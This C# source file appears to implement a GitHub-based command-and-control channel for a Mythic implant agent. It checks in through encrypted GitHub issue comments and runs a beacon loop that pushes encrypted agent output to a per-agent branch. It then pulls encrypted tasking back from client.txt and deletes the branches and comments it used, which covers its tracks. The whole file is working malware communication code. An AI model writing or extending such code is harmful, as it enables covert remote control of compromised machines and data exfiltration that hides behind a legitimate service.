using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;
using Octokit;
using System.Text;
using System.Text.Json;

namespace Workflow.Channels
{
    public class GitHub : IChannel
    {
        private IServiceConfig agentConfig { get; set; }
        private ISecurityProvider crypt { get; set; }
        private IDataBroker messageManager { get; set; }
        private ILogger logger { get; set; }
        private ManualResetEventSlim checkinAvailable = new ManualResetEventSlim(false);
        private AutoResetEvent clientReady = new AutoResetEvent(false);
        private readonly string _uuid = Guid.NewGuid().ToString();
        private CheckinResponse cir;

        private bool checkedin = false;
        private bool connected = false;
        private int currentAttempt = 0;
        private int maxAttempts = 10;

        public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;

        private CancellationTokenSource cancellationTokenSource { get; set; } = new CancellationTokenSource();
        private static readonly GitHubClient client = new GitHubClient(new ProductHeaderValue("ApiClient"));
        private readonly string githubToken;
        private readonly string owner;
        private readonly string repo;
        private readonly int serverIssue;
        private readonly int clientIssue;

        public GitHub(IServiceConfig config, ISecurityProvider crypto, ILogger logger, IDataBroker messageManager)
        {
            this.crypt = crypto;
            this.agentConfig = config;
            this.messageManager = messageManager;

            var opts = System.Text.Json.JsonSerializer.Deserialize(
                ChannelConfig.Decode(),
                GitHubChannelOptionsJsonContext.Default.GitHubChannelOptions);

            this.githubToken = opts.PersonalAccessToken;
            this.owner = opts.GithubUsername;
            this.repo = opts.GithubRepo;
            this.serverIssue = opts.ServerIssueNumber;
            this.clientIssue = opts.ClientIssueNumber;

            var tokenAuth = new Credentials(githubToken);
            client.Credentials = tokenAuth;
            DebugLog.Log("GitHub config loaded");
        }

        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            // Post Checkin
            DebugLog.Log("GitHub sending checkin");

            // Send Checkin
            string msg = JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin);
            string checkin_msg = this.crypt.Encrypt(msg);
            try
            {
                var createdComment = await client.Issue.Comment.Create(owner, repo, clientIssue, checkin_msg);

            }
            catch (Exception e)
            {
                DebugLog.Log($"GitHub checkin error: {e.Message}");
            }

            // Retrieve Checkin Response (cir)
            int maxAttempts = 3;
            int currentAttempt = 0;
            do
            {
                // Relax.. wait for Mythic to post a checkin response (cir) to GitHub for the agent to retrieve 
                await Task.Delay(3000);

                List<string> comments = await GetComments();
                // there should only be one valid comment returned since it's the checkin response
                if (comments.Count == 1)
                {
                    DebugLog.Log("GitHub checkin response received");
                    this.checkedin = true;
                    this.cir = JsonSerializer.Deserialize<CheckinResponse>(comments[0]);
                    return this.cir;
                }
                DebugLog.Log($"GitHub waiting for checkin response, attempt {currentAttempt + 1}/{maxAttempts}");
                currentAttempt++;
            } while (currentAttempt <= maxAttempts);
            
            return new CheckinResponse()
            {
                status = "failed"
            };
        }

        public async Task StartBeacon()
        {
            //Main beacon loop handled here
            DebugLog.Log("GitHub beacon starting");

            this.cancellationTokenSource = new CancellationTokenSource();
            while (!cancellationTokenSource.Token.IsCancellationRequested)
            {
                // Create new branch
                DebugLog.Log("GitHub creating branch");
                var baseRef = await client.Git.Reference.Get(owner, repo, $"heads/main");
                var newBranchRef = new NewReference($"refs/heads/{agentConfig.uuid}", baseRef.Object.Sha);
                var createdRef = await client.Git.Reference.Create(owner, repo, newBranchRef);
                string firstCommitHash = createdRef.Object.Sha;

                DebugLog.Log("GitHub pushing message to repo");
                // Push get_tasking message to repo for server to retrieve
                string agentSha = "";
                try
                {
                    string message = this.crypt.Encrypt(messageManager.GetAgentResponseString());
                    DebugLog.Log($"GitHub encrypted message ({message.Length} bytes)");
                    var createRequest = new CreateFileRequest(agentConfig.uuid, message, agentConfig.uuid);
                    var result = await client.Repository.Content.CreateFile(owner, repo, "server.txt", createRequest);
                    agentSha = result.Commit.Sha;
                }
                catch (Exception e)
                {
                    DebugLog.Log($"GitHub push error: {e.Message}");
                }

                // Wait for Mythic to push response back to GitHub repo
                DebugLog.Log("GitHub waiting for response");
                int maxAttempts = 3;
                int currentAttempt = 0;
                bool isSuccessful = false;
                do
                {
                    await Task.Delay(3000);
                    try
                    {
                        var branch = await client.Repository.Branch.Get(owner, repo, agentConfig.uuid);
                        if (branch.Commit.Sha != agentSha)
                        {
                            isSuccessful = true;
                        }
                    }
                    catch (NotFoundException)
                    {
                        DebugLog.Log("GitHub response not available yet");
                    }
                    catch (Exception ex)
                    {
                        DebugLog.Log($"GitHub poll error: {ex.Message}");
                    }
                    currentAttempt++;
                }
                while (!isSuccessful && currentAttempt < maxAttempts);

                // Retrieve get_tasking response from repo
                DebugLog.Log("GitHub retrieving response");
                try
                {
                    var fileContents = await client.Repository.Content.GetAllContentsByRef(owner, repo, "client.txt", agentConfig.uuid);
                    string mythResp = this.crypt.Decrypt(fileContents[0].Content);
                    DebugLog.Log("GitHub response retrieved and decrypted");
                    GetTaskingResponse gtr = JsonSerializer.Deserialize(mythResp, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                    if (gtr != null)
                    {
                        TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
                        this.SetTaskingReceived(null, tra);
                    }
                }
                catch (NotFoundException)
                {
                    DebugLog.Log("GitHub client.txt not found in branch");
                }
                catch (Exception ex)
                {
                    DebugLog.Log($"GitHub retrieve error: {ex.Message}");
                }

                if (this.currentAttempt >= this.maxAttempts)
                {
                    this.cancellationTokenSource.Cancel();
                }

                // Delete branch
                DebugLog.Log("GitHub deleting branch");
                try
                {
                    // Delete the branch
                    await client.Git.Reference.Delete(owner, repo, $"refs/heads/{agentConfig.uuid}");
                    DebugLog.Log("GitHub branch deleted");
                }
                catch (Exception ex)
                {
                    DebugLog.Log($"GitHub branch delete error: {ex.Message}");
                }
                // Rest
                await Task.Delay(Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000);
            }
        }

        public bool StopBeacon()
        {
            this.cancellationTokenSource.Cancel();
            return true;
        }

        internal async Task<List<string>> GetComments()
        {
            // Get all comments
            var comments = new List<string>();

            try
            {
                var all_comments = await client.Issue.Comment.GetAllForIssue(owner, repo, serverIssue);
                DebugLog.Log($"GitHub GetComments found {all_comments.Count} comments");
                foreach (var comment in all_comments)
                {
                    // check if message is for us
                    var msg = Encoding.UTF8.GetString(Convert.FromBase64String(comment.Body));
                    var payloadUuid = msg.Substring(0, 36);
                    if (payloadUuid == agentConfig.uuid)
                    {
                        DebugLog.Log("GitHub comment matched our UUID");
                        comments.Add(this.crypt.Decrypt(comment.Body));
                        //delete comment
                        try
                        {
                            await client.Issue.Comment.Delete(owner, repo, comment.Id);
                        }
                        catch (Exception e)
                        {
                            DebugLog.Log($"GitHub error: {e.Message}");
                        }
                    }
                }
            }
            catch (Exception e )
            {
                DebugLog.Log($"GitHub error: {e.Message}");
            }
            return comments;
        }
    }
}